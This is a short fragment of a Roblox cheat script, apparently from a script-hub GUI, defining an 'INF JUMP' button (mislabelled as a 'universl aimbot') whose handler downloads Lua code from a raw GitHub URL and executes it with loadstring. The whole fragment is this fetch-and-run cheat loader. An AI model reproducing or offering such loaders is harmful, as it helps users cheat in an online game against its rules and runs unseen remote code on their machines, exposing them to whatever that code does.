...
fps:NewButton("INF JUMP", "universl aimbot with gui", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Chillidog36/beginner-roblox-shit/main/inf%20jump',true))()
end)
